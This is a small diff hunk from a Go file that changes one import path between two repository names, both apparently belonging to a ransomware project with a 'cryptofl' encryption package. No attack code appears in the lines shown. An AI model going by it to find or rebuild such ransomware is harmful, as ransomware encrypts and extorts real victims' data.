@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
-	"github.com/Ywern1/ransomware-go/cryptofl"
+	"github.com/Ywern1/go-ransomware/cryptofl"
 	"runtime"
 	"strings"
 	"sync"
